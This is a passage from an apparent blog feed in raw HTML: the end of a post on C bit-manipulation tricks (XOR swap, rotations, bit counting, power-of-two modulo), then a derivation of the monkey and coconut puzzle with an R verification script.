  <span class="n">z</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
  <span class="n">x</span> <span class="o">=</span> <span class="n">y</span><span class="p">;</span>
  <span class="n">y</span> <span class="o">=</span> <span class="n">z</span><span class="p">;</span></code></pre></figure> <p>In practice, many compilers optimize this code and eliminate the temporary variable. However, there is also an elegant approach to perform this manually using the bitwise exclusive OR (XOR) operator:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c">  <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">35</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">67</span><span class="p">;</span>
  <span class="n">x</span> <span class="o">=</span> <span class="n">x</span> <span class="o">^</span> <span class="n">y</span><span class="p">;</span>  <span class="c1">// x = 96</span>
  <span class="n">y</span> <span class="o">=</span> <span class="n">x</span> <span class="o">^</span> <span class="n">y</span><span class="p">;</span>  <span class="c1">// y = 67</span>
  <span class="n">x</span> <span class="o">=</span> <span class="n">x</span> <span class="o">^</span> <span class="n">y</span><span class="p">;</span>  <span class="c1">// x = 35 </span></code></pre></figure> <p>This uses the property of the exclusive or that \(x \oplus x = 0\) and its associative and commutative property, so that for instance \(x \oplus y \oplus x = x \oplus x \oplus y = (x \oplus x) \oplus y = 0 \oplus y = y\). One could similarily solve the problem with (as a side note):</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"> <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">35</span><span class="p">;</span>
 <span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">67</span><span class="p">;</span>
 <span class="n">x</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="n">y</span><span class="p">;</span>
 <span class="n">y</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">;</span>
 <span class="n">x</span> <span class="o">=</span> <span class="n">y</span> <span class="o">-</span> <span class="n">x</span><span class="p">;</span></code></pre></figure> <p>To be precise, this method works for all Abelian groups that satisfy the properties of commutativity, associativity, the existence of an identity element, and the existence of an inverse for each element (or where each element is its own inverse).</p> <h2 id="shifting-and-rotating">Shifting and Rotating</h2> <p>Commonly used bitwise operations include the shifting operations. There are two main types in C: the right shift <code class="language-plaintext highlighter-rouge">&gt;&gt;</code> and the left shift <code class="language-plaintext highlighter-rouge">&lt;&lt;</code>. In C, the right shift is typically an arithmetic operation, shifting all bits to the right while preserving the sign (padding with the most significant bit). The left shift, on the other hand, pads the least significant bits with zeros. However, this behavior is implementation-dependent; some compilers may perform a logical right shift, where padding is done with zeros.</p> <p>In Java, the arithmetic right shift is also represented by <code class="language-plaintext highlighter-rouge">&gt;&gt;</code>, where the padding is done with the most significant bit to preserve the sign. Java also provides the logical right shift using <code class="language-plaintext highlighter-rouge">&gt;&gt;&gt;</code>, which pads with zeros. Arithmetically, a left shift by one is equivalent to multiplying an integer by 2, while an arithmetic right shift by one corresponds to integer division by 2.</p> <p>Most CPUs also support left and right rotating operations. In this case, bits that are shifted out from one side of the bit-field are wrapped around and padded on the other side. However, many high-level programming languages do not support these operations directly. With the following inline assembler code, you can also perform left and right rotations on X86_X64 platforms.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/*
 * Rotatate 64bit variable x by y bits. Note that this is not a shift-operation but a real
 * roll-left
 ****/</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="kt">uint64_t</span> <span class="nf">rol</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">x</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__asm__</span> <span class="p">(</span><span class="s">"rolq %1, %0"</span> <span class="o">:</span> <span class="s">"+g"</span> <span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">:</span> <span class="s">"cJ"</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">n</span><span class="p">));</span>
    <span class="k">return</span> <span class="n">x</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/*
 * Same as rol, only rotates right instead of left.
 ****/</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="kt">uint64_t</span> <span class="nf">ror</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">x</span> <span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">n</span> <span class="p">)</span> <span class="p">{</span>
    <span class="n">__asm__</span> <span class="p">(</span><span class="s">"rorq %1, %0"</span> <span class="o">:</span> <span class="s">"+g"</span> <span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">:</span> <span class="s">"cJ"</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">n</span><span class="p">));</span>
    <span class="k">return</span> <span class="n">x</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <h2 id="how-to-setdelete-a-bit-in-a-bit-field">How to set/delete a Bit in a Bit Field</h2> <p>Many programmers often wonder how to set, remove, or invert a bit in a bit-field. This can be easily achieved using the bitwise OR and AND operators, as demonstrated by the following functions:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/*
 * Sets a bit (sets it to 1)
 ****/</span>
<span class="kt">uint64_t</span> <span class="nf">setBit</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">b</span><span class="p">,</span> <span class="kt">int</span> <span class="n">bit</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">b</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/*
 * Deletes a bit (sets it to 0)
 ****/</span>
<span class="kt">uint64_t</span> <span class="nf">deleteBit</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">b</span><span class="p">,</span> <span class="kt">int</span> <span class="n">bit</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">b</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">));</span>
<span class="p">}</span>

<span class="cm">/*
 * Inverts a bit (sets it to 1)
 ****/</span>
<span class="kt">uint64_t</span> <span class="nf">invertBit</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">b</span><span class="p">,</span> <span class="kt">int</span> <span class="n">bit</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">b</span> <span class="o">^</span> <span class="p">(</span><span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure> <h2 id="counting-the-set-bits-in-a-bit-field">Counting the set Bits in a Bit Field</h2> <p>If you want to count the bits in a bit-field, a naive approach might involve masking out one bit at a time and checking if it is set. However, if only a few bits are set, the following function will perform much faster. In fact, it only requires as many iterations as there are set bits in the variable. This function is designed for 64-bit values but can easily be adjusted for 32-bit or 16-bit variables.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/*
 * Fast way to count the one-bits in a 64bit variable.
 * Only requires as many iterations as bits are set.
 ****/</span>
<span class="kt">int</span> <span class="nf">bitCount</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">ZERO</span> <span class="o">=</span> <span class="mh">0x1</span><span class="n">p0</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="n">ZERO</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">x</span> <span class="o">&amp;=</span> <span class="p">(</span><span class="n">x</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">c</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <h2 id="find-the-position-of-a-set-bit">Find the Position of a set Bit</h2> <p>Sometimes, you may want to find the position of a single set bit in a bit-field. A naive approach would involve iterating through all the bits and checking each one to see if it is set. However, this results in linear time complexity. For a 64-bit variable, you would require 64 iterations in the worst case. We can improve on this.</p> <p>The following approach is similar to the divide-and-conquer strategies commonly used in many problems. First, we check which half of the bit-field contains the set bit. Then, we split that half into two parts and check which one contains the set bit, continuing this process iteratively. With this approach, we can locate the bit in logarithmic time. For a 64-bit variable, this would take just 6 iterations, which is significantly faster than the 64 iterations required by the naive method.</p> <p>Note, however, that this function assumes only a single bit is set in the entire bit-field. Mathematically, this function computes the binary logarithm of a value that is a power of two.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">ZERO</span> <span class="o">=</span> <span class="mh">0x1</span><span class="n">p0</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">B32</span> <span class="o">=</span> <span class="mh">0x1</span><span class="n">p32</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">B16</span> <span class="o">=</span> <span class="mh">0x1</span><span class="n">p16</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">B08</span> <span class="o">=</span> <span class="mh">0x1</span><span class="n">p8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">B04</span> <span class="o">=</span> <span class="mh">0x1</span><span class="n">p4</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">B02</span> <span class="o">=</span> <span class="mh">0x1</span><span class="n">p2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">B01</span> <span class="o">=</span> <span class="mh">0x1</span><span class="n">p1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">B_LVL</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">B01</span><span class="p">,</span> <span class="n">B02</span><span class="p">,</span> <span class="n">B04</span><span class="p">,</span> <span class="n">B08</span><span class="p">,</span> <span class="n">B16</span><span class="p">,</span> <span class="n">B32</span><span class="p">};</span>

<span class="cm">/*
 * Determines the position of a single bit in a 64bit variable in logarithmic time.
 * Basically the same as the binary logarithm of a power of two.
 ****/</span>
<span class="kt">int</span> <span class="nf">bitPos</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">bPos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">x</span> <span class="o">&amp;</span> <span class="n">B_LVL</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="n">ZERO</span><span class="p">)</span> <span class="p">{</span>
            <span class="kt">int</span> <span class="n">nBits</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">B01</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">;</span>
            <span class="n">x</span> <span class="o">&gt;&gt;=</span> <span class="n">nBits</span><span class="p">;</span>
            <span class="n">bPos</span> <span class="o">+=</span> <span class="n">nBits</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">bPos</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <h2 id="modulo-operations-for-divisors-of-powers-of-two">Modulo Operations for Divisors of Powers of Two</h2> <p>Similar to the decimal system, where a modulo operation with a divisor of 10 returns the last digit (assuming the dividend is positive), and a modulo operation with 100 returns the last two digits (and so on), a modulo operation with a binary \((10)_2\) (which is 2 in the decimal system) and \((100)_2\) (which is 4 in the decimal system) would return the last binary digit and the last two binary digits, respectively.</p> <p>Thus, a modulo operation by a power of two can be implemented efficiently and can save significant computation time when used repeatedly. For example, if you have a hash table with \(2^n\) entries, you can easily map a hash value to an index in the table using such a modulo operation. If the hash table is accessed many millions of times, using an efficient modulo implementation can save considerable time. Note that many compilers’ optimizers do not take into account the special case where the divisor is a power of two.</p> <p>A modulo function that computes \(x \, \mbox{mod} \, 2^n\) might look like this:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">uint64_t</span> <span class="nf">modPow2</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">x</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>]]></content><author><name></name></author><category term="bit"/><category term="twiddling"/><category term="hacks"/><category term="performance"/><category term="speed"/><summary type="html"><![CDATA[When working with bit-fields, there are several techniques that can significantly speed up code — beyond the inherent performance benefits that bit-fields provide for many problems. In this post, I will introduce a few bit-twiddling tricks that I occasionally use, which can be useful for a variety of tasks.]]></summary></entry><entry><title type="html">The Monkey and Coconut Problem</title><link href="https://markusthill.github.io/blog/2024/the-sailors-problem/" rel="alternate" type="text/html" title="The Monkey and Coconut Problem"/><published>2024-05-26T00:00:00+00:00</published><updated>2024-05-26T00:00:00+00:00</updated><id>https://markusthill.github.io/blog/2024/the-sailors-problem</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/the-sailors-problem/"><![CDATA[<p>Three sailors, stranded on a deserted island with a monkey, gather a pile of coconuts to be divided among themselves the next morning. During the night, one of the sailors wakes up, secretly divides the pile into three equal parts, and finds an extra coconut, which he gives to the monkey. He hides his share and combines the remaining coconuts back into a single heap. Later that night, the second sailor does the same: dividing the pile into three equal parts, giving the leftover coconut to the monkey, hiding his share, and returning the rest to the heap. The third sailor repeats the process in the same manner.</p> <p>The next morning, the sailors divide the remaining pile of coconuts into three equal parts, once again finding an extra coconut, which they give to the monkey.</p> <p>The question is: how many coconuts were originally in the pile?</p> <p>Additionally, a general solution should be determined for \(n\) coconuts, \(k\) sailors, and \(m\) monkeys.</p> <h2 id="derivation">Derivation</h2> <p>So, let us start writing down the given information in a more mathematical form, but without too much strict math.</p> <p>To summarize, we have a number of sailors: \(\begin{align} k \in \mathbb{N_+} \backslash \{ 1\} \end{align}\) where \(\mathbb{N_+}\) is the set of positive natural numbers, and \(k = 1\) is excluded since only one sailor is not interesting for this problem.</p> <p>The number of coconuts collected by the sailors before the night: \(\begin{align} n \in \mathbb{N_+}, \end{align}\) which must also be a positive natural number.</p> <p>Finally, the number of monkeys is given by: \(\begin{align} m \in \mathbb{N_+}, \ m &lt; k, \end{align}\) indicating that there are fewer monkeys than sailors.</p> <p>The first sailor, who wakes up first, divides the number of coconuts by the number of sailors. He gives the remaining coconuts to the monkeys. This results in \(k\) shares, each of size \((n-m)/k\). The first sailor buries his (stolen) share, leaving behind the following number of coconuts:<br/> \begin{align} n_1 = \frac{n-m}{k}(k-1)=(n-m)\frac{k-1}{k} \label{eq:n1} \end{align}</p> <p>The second sailor, who wakes up next, repeats the procedure of the first sailor: \(\begin{align} n_2 &amp;= (n_1-m)\frac{k-1}{k}=\big((n-m)\frac{k-1}{k} -m \big) \frac{k-1}{k} \\ &amp;= (n-m) \big(\frac{k-1}{k} \big)^2 - m\frac{k-1}{k} \end{align}\)</p> <p>Then, the third sailor wakes up and performs the same process: \(\begin{align} n_3 &amp;= \Bigg(\bigg((n-m)\frac{k-1}{k}-m\bigg)\frac{k-1}{k} - m\Bigg) \frac{k-1}{k} \\ &amp;= (n-m) \Big(\frac{k-1}{k}\Big)^3 - m\Big(\frac{k-1}{k}\Big)^2 - m\frac{k-1}{k} \end{align}\)</p> <p>For the \(i\)-th sailor, where \(1 \leq i \leq k\), we derive the general recursive rule: \(\begin{align} n_i = (n_{i-1}-m)\frac{k-1}{k}. \end{align}\)</p> <p>For every sailor, we subtract \(m\) coconuts from the previous count \(n_{i-1}\), and then multiply by \(\frac{k-1}{k}\). This relationship can also be expressed as (for \(i &gt; 1\)):</p> <p>\(\begin{align} n_i &amp;= (n-m)\bigg(\frac{k-1}{k} \bigg)^i - m\bigg(\frac{k-1}{k} \bigg)^{i-1} - \ldots - m\frac{k-1}{k} \\ &amp;= (n-m)\bigg(\frac{k-1}{k} \bigg)^i - m\sum_{\substack{j=1 \\ i&gt;1}}^{i-1}\bigg(\frac{k-1}{k} \bigg)^j \end{align}\) For our convenience, we define the initial number of coconuts as \(n_0 = n\). Hence, we can write \(n_i\) for all \(0 \leq i\leq k\) as: \(\begin{align} n_i=\begin{cases} n, &amp; \mbox{for} \ i=0 \\ (n-m)\bigg(\frac{k-1}{k} \bigg)^i - m\sum\limits_{\substack{j=1 \\ i&gt;1}}^{i-1}\bigg(\frac{k-1}{k} \bigg)^j, &amp; \mbox{else} \end{cases} \label{eq:iterativeForm} \end{align}\)</p> <p>In order to find an initial amount of coconuts \(n\), we have to ensure that all \(n_i\) are dividable by \(k\) with a remainder of one (which is given to the monkey). Hence, it has to be ensured that: \(\begin{align} \forall i \in \{ 0, \ldots, k\}: \ n_i \equiv m\mod k \label{eq:forallI} \end{align}\) Remember that in the morning, after all \(k\) sailors have woken up, the remaining coconuts are divided among all sailors. So, as stated above, \(n_k\) must have a remainder of one when divided by \(k\). For \(n_0 = n\), it is sufficient to ensure that \(n\) is a multiple of \(k\) plus \(m\).</p> <p>For larger \(i\), the situation becomes slightly more complex. We need to find an \(n\) that satisfies Eq. \eqref{eq:iterativeForm} such that Eq. \eqref{eq:forallI} is also satisfied. To achieve this, let us first simplify the complicated expression (assuming \(i &gt; 1\)) in Eq. \eqref{eq:iterativeForm} using the geometric series specified in the Appendix:</p> \[\begin{align} &amp; \ \ (n-m)\bigg(\frac{k-1}{k} \bigg)^i - m\sum\limits_{\substack{j=1 \\ i&gt;1}}^{i-1}\bigg(\frac{k-1}{k} \bigg)^j \label{eq:probWithSum} \\ &amp;= (n-m)\bigg(\frac{k-1}{k} \bigg)^i - m\frac{ \Big(\frac{k-1}{k}\Big)^i - \frac{k-1}{k}}{\frac{k-1}{k} - 1} \\ &amp;= (n-m)\bigg(\frac{k-1}{k} \bigg)^i - m\frac{ \Big(\frac{k-1}{k}\Big)^i - \frac{k-1}{k}}{-\frac{1}{k}} \\ &amp;= (n-m)\bigg(\frac{k-1}{k} \bigg)^i + mk \bigg(\frac{k-1}{k} \bigg)^i-mk+m \\ &amp;= (n-m+mk)\bigg(\frac{k-1}{k} \bigg)^i -mk+m. \label{eq:iterativeSimple} \end{align}\] <p>Now we can try to find an \(n\) that suffices Eq. \eqref{eq:forallI}:</p> \[\begin{align} (n-m+mk)\bigg(\frac{k-1}{k} \bigg)^i -mk+m &amp;\equiv m \mod k \\ (n-m+mk)\bigg(\frac{k-1}{k} \bigg)^i -mk &amp;\equiv 0 \mod k \\ (n-m+mk)\bigg(\frac{k-1}{k} \bigg)^i &amp;\equiv 0 \mod k \label{eq:modulo} \end{align}\] <p>Note that we cannot get rid of the term \(mk\), since the power of the fraction is smaller than one and not a natural number. The left-hand side of Eq. \eqref{eq:modulo} should hence be a multiple of \(k\). This can be expressed as:</p> \[\begin{align} (n-m+mk)\bigg(\frac{k-1}{k} \bigg)^i = r\cdot k, \end{align}\] <p>where for now we choose \(r \in \mathbb{Z}\) and then solve for \(n\):</p> \[\begin{align} (n-m+mk)\bigg(\frac{k-1}{k} \bigg)^i &amp;= r\cdot k \\ n-m+mk &amp;= r\cdot k \bigg(\frac{k}{k-1} \bigg)^i \\ n &amp;= r\cdot k \bigg(\frac{k}{k-1} \bigg)^i - mk + m \\ n &amp;= r\cdot \frac{k^{k+1}}{(k-1)^i} - m(k -1) \label{eq:firstN}. \end{align}\] <p>Although we can now compute different values for \(n\) according to \eqref{eq:firstN} which will suffice Eq. \eqref{eq:modulo}, we can observe a problem: For example, with \(i=k=3\) and \(m=r=1\) we receive a value of \(n=8.125\), which – although it suffices Eq. \eqref{eq:modulo} – is not a natural number. This is due to the fraction in Eq. \eqref{eq:firstN}. However, we show in the Appendix that numerator and denominator are relatively prime to each other, hence, the fraction cannot be reduced. So, in order to obtain a natural number for \(n\), we can drag the denominator to \(r\) and assume that \(r\) is a multiple of it by replacing \(r/(k-1)^i\) with \(q \in \mathbb{N_+}\):</p> \[\begin{align} n &amp;= r\cdot \frac{k^{k+1}}{(k-1)^i} - m(k -1) \\ &amp;= \frac{r}{(k-1)^i} \cdot k^{k+1} - m(k -1) \\ &amp;= q \cdot k^{k+1} - m(k -1). \label{eq:finalSolution} \end{align}\] <p>Note that in Eq. \eqref{eq:finalSolution} we have an expression which is independent of \(i\) and hence fulfills Eq. \eqref{eq:forallI} for all \(i \in \{2, \ldots, k \}\).</p> <p>You might have noticed that we actually only solved the problem for \(i &gt; 1\), since the sum in Eq. \eqref{eq:probWithSum} is only evaluated for \(i &gt; 1\). However, Eq. \eqref{eq:forallI} requires that the condition holds for all \(i \in \{0, \ldots, k\}\) – meaning it must also be satisfied for \(i = 0\) and \(i = 1\) – ensuring that \(n_i \equiv m \mod k\).</p> <p>We can directly observe that Eq. \eqref{eq:finalSolution} is a valid solution for the case \(i = 0\). Furthermore, we can show that the case \(i = 1\), as specified in Eq. \eqref{eq:n1}, is merely a special case of Eq. \eqref{eq:firstN}, with:</p> \[\begin{align} (n-m)\frac{k-1}{k} &amp;\equiv m\mod k \\ \Rightarrow (n-m)\frac{k-1}{k} &amp;= s \cdot k + m \\ n &amp;= s \cdot k\frac{k}{k-1} + m\frac{k}{k-1} + m \\ &amp;= \frac{sk^2+mk}{k-1} + m \label{eq:casen1} \end{align}\] <p>and:</p> \[\begin{align} \frac{sk^2+mk}{k-1} + m &amp;= r\cdot \frac{k^{k+1}}{(k-1)^1} - mk + m \\ sk^2+mk &amp;= r k^{k+1} - mk(k-1) \\ sk +m &amp;= rk^k - mk + m \\ s &amp;= rk^{k-1} - m \in \mathbb{N}. \end{align}\] <p>Hence, if we insert \(s\) into Eq. \eqref{eq:casen1} we obtain Eq. \eqref{eq:firstN} which then leads to the general solution in Eq. \eqref{eq:finalSolution}.</p> <h2 id="verification">Verification</h2> <p>To make sure that we have obtained a correct solution, let us run some simulations where we try many values for \(n=n_0\) and check if these values correspond to Eq. \eqref{eq:finalSolution}.</p> <figure class="highlight"><pre><code class="language-r" data-lang="r"><span class="c1"># Number of Sailors</span><span class="w">
</span><span class="n">k</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="m">3</span><span class="w">

</span><span class="c1"># Number of Monkeys on the island</span><span class="w">
</span><span class="n">m</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="m">2</span><span class="w">

</span><span class="c1"># Range of coconuts to try (1 2 3 ... n_max):</span><span class="w">
</span><span class="n">n_max</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="m">1e6</span><span class="w">

</span><span class="c1"># There should be less monkeys than sailors</span><span class="w">
</span><span class="n">stopifnot</span><span class="p">(</span><span class="n">m</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">k</span><span class="p">)</span><span class="w">

</span><span class="c1"># Recursive function simulating the sailors behaviour</span><span class="w">
</span><span class="n">divideCocos</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="w"> </span><span class="n">sailor</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="k">if</span><span class="p">(</span><span class="n">sailor</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="m">0</span><span class="p">)</span><span class="w"> </span><span class="n">return</span><span class="w"> </span><span class="p">(</span><span class="kc">TRUE</span><span class="p">)</span><span class="w">
  </span><span class="k">if</span><span class="p">((</span><span class="n">n</span><span class="w"> </span><span class="o">%%</span><span class="w"> </span><span class="n">k</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">m</span><span class="p">)</span><span class="w"> </span><span class="n">return</span><span class="w"> </span><span class="p">(</span><span class="n">divideCocos</span><span class="p">((</span><span class="n">n</span><span class="o">-</span><span class="n">m</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="n">k</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m">1</span><span class="p">),</span><span class="w"> </span><span class="n">sailor</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m">1</span><span class="p">))</span><span class="w">
  </span><span class="kc">FALSE</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="n">tryN</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">sapply</span><span class="p">(</span><span class="m">1</span><span class="o">:</span><span class="n">n_max</span><span class="p">,</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="n">divideCocos</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">k</span><span class="p">))</span><span class="w">
</span><span class="n">realN</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">which</span><span class="p">(</span><span class="n">tryN</span><span class="p">)</span><span class="w">

</span><span class="c1"># Compare with formula</span><span class="w">
</span><span class="n">formulaNCocos</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="n">k</span><span class="p">,</span><span class="w"> </span><span class="n">m</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="n">q</span><span class="o">*</span><span class="n">k</span><span class="o">^</span><span class="p">(</span><span class="n">k</span><span class="m">+1</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">m</span><span class="o">*</span><span class="p">(</span><span class="n">k</span><span class="m">-1</span><span class="p">)</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="n">formulaN</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">sapply</span><span class="p">(</span><span class="m">1</span><span class="o">:</span><span class="nf">length</span><span class="p">(</span><span class="n">realN</span><span class="p">),</span><span class="w"> </span><span class="n">formulaNCocos</span><span class="p">,</span><span class="w"> </span><span class="n">k</span><span class="p">,</span><span class="w"> </span><span class="n">m</span><span class="p">)</span><span class="w">

</span><span class="c1"># Check if the simulated results fit to the formula we obtained</span><span class="w">
</span><span class="n">anyError</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">which</span><span class="p">(</span><span class="n">formulaN</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">realN</span><span class="p">)</span><span class="w">
</span><span class="n">stopifnot</span><span class="p">(</span><span class="nf">length</span><span class="p">(</span><span class="n">anyError</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="p">)</span><span class="w">

</span><span class="n">cat</span><span class="p">(</span><span class="s2">"Formula appears to be correct!!!\n"</span><span class="p">)</span><span class="w">
</span><span class="n">cat</span><span class="p">(</span><span class="s2">"\nSome numbers n that work:"</span><span class="p">,</span><span class="w"> </span><span class="n">realN</span><span class="p">[</span><span class="m">1</span><span class="o">:</span><span class="nf">min</span><span class="p">(</span><span class="m">25</span><span class="p">,</span><span class="w"> </span><span class="nf">length</span><span class="p">(</span><span class="n">realN</span><span class="p">))])</span></code></pre></figure> <p>We can run this R-script for different settings of sailors and monkeys and check if there are any differences between the simulated results and the formula. In such a case, the formula would be wrong.<br/> However, after trying several combinations, we can be quite confident that the formula is correct (although the computer simulation is certainly not a real proof). For our initial setup with \(k = 3\) sailors and \(m = 1\) monkey, we get the following result with the R script:</p> <figure class="highlight"><pre><code class="language-r" data-lang="r"><span class="n">Formula</span><span class="w"> </span><span class="n">appears</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">correct</span><span class="o">!!!</span><span class="w">
